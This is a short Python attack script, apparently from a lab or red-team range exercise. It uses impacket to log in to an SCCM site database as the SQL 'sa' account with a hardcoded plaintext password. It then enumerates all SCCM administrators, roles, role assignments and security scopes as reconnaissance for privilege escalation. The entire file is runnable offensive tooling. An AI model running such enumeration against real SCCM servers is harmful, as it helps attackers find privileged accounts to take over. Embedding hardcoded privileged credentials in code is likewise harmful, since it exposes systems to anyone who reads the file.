# SCCM DB enumeration via sa (impacket.tds) — analyst_t1 (ws01 ATTACK)
import sys
from impacket.tds import MSSQL

host = 'mbr02.range.local'
sql = MSSQL(host, 1433)
sql.connect('sa', 's@_P@ssw0rd!L@b!', database='CM_CAD')
print('[+] connected to CM_CAD as sa')

def q(title, query):
    print('\n=== %s ===' % title)
    try:
        sql.sql_query(query)
        for row in sql.getReplies():
            print(row)
    except Exception as e:
        print('ERR: %s' % e)

q('SMS_Admin (all admins)', "SELECT AdminID, LogonName, IsGroup FROM SMS_Admin")
q('SMS_Role (roles)', "SELECT RoleID, RoleName FROM SMS_Role")
q('SMS_AdminRole (admin->role)', "SELECT AdminID, RoleID FROM SMS_AdminRole")
q('SMS_AdminCategory (admin->scope/category)', "SELECT * FROM SMS_AdminCategory")
q('SMS_Category (categories/scopes)', "SELECT CategoryID, CategoryName, CategoryType FROM SMS_Category")
print('\nSQL_ENUM_DONE')
